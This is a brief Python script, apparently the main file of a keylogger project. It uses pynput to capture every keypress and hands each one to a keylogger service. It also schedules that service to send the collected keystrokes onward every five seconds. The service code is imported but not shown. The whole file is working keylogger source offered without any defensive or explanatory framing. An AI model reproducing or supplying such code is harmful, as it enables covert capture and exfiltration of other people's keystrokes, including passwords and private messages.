import time
import schedule

from pynput.keyboard import Listener
from src.services import keylogger_service

def on_press(key):
    keylogger_service.set_keypress(key)

schedule.every(5).seconds.do(keylogger_service.send_keypress)

with Listener(on_press=on_press) as listener:
    while True:
        schedule.run_pending()  
        time.sleep(1) 